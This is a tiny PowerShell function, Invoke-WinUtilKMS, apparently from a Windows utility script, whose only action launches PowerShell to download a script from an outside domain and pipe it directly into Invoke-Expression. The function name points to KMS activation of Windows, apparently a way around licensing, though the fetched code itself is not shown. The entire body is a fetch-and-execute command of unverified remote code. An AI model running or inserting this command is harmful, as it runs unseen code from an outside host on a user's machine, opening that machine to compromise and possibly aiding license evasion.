function Invoke-WinUtilKMS {

    Start-Process powershell -ArgumentList '-Command "irm https://compourri.co.za/KMS | iex"'
}
